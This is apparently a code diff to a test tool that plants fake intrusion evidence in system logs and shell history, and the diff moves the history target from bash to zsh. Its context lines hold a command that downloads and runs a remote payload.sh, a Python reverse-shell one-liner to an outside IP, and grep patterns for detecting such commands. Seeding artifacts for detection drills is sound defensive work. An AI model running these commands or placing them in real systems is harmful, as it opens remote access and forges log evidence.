@@ -209,7 +209,7 @@ PKGEOF
 echo "   → Injected suspicious package activity"
 
 echo "[7/7] Planting suspicious bash history (Check 8)..."
-cat >> ~/.bash_history << 'HISTEOF'
+cat >> ~/.zsh_history << 'HISTEOF'
 wget http://185.220.101.1/payload.sh
 chmod +x payload.sh && ./payload.sh
 python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("185.220.101.1",4444));os.dup2(s.fileno(),0)'
@@ -227,7 +227,7 @@ echo "Summary of injected artifacts:"
 echo "  • /var/log/auth.log (or /var/log/secure) — SSH failures, sudo abuse, user creation"
 echo "  • /var/log/cron (or /var/log/syslog)     — off-hours cron jobs"
 echo "  • /var/log/yum.log (or dpkg.log)          — unexpected packages"
-echo "  • ~/.bash_history                          — suspicious commands"
+echo "  • ~/.zsh_history                          — suspicious commands"
 """
     return script
 
@@ -274,7 +274,7 @@ def verify_logs(c: Connection):
         ("User creation events",
          "grep -c 'new user:' /var/log/auth.log 2>/dev/null || grep -c 'new user:' /var/log/secure 2>/dev/null || echo 0"),
         ("Suspicious bash history",
-         "grep -c 'wget\\|curl\\|nc -e\\|base64' ~/.bash_history 2>/dev/null || echo 0"),
+         "grep -c 'wget\\|curl\\|nc -e\\|base64' ~/.zsh_history 2>/dev/null || echo 0"),
     ]
 
     all_ok = True
